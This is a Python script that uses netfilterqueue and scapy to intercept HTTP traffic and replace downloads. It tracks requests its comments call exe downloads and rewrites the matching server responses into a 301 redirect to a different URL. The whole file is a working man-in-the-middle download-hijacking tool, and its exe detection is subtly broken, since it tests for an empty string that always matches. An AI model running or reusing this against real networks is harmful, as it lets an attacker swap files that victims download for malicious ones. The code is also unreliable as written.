#!/usr/bin/env python

import netfilterqueue
# module that allow to access the queue from python
import scapy.all as scapy


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


location_to_redirect = "Location: " + "https://books.goalkicker.com/AlgorithmsBook/"


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # if destination port of TCP = 80 , which is a HTTP port
            # that means the packet is a request
            if "" in scapy_packet[scapy.Raw].load:
                # detecting exe file
                print("exe Request : ")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # appending the ack of the packet on the list
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            # response filed
            # if source port of TCP = 80 , which is a HTTP port
            # that means the packet is a response
            if scapy_packet[scapy.TCP].seq in ack_list:
                # check if the sequence is contained in my ack_list
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                # clearing the list for a potential packet
                print("replacing file  : ")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\n" + location_to_redirect)
                # 301 moved permanently
                packet.set_payload(str(modified_packet))

    packet.accept()
    # packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
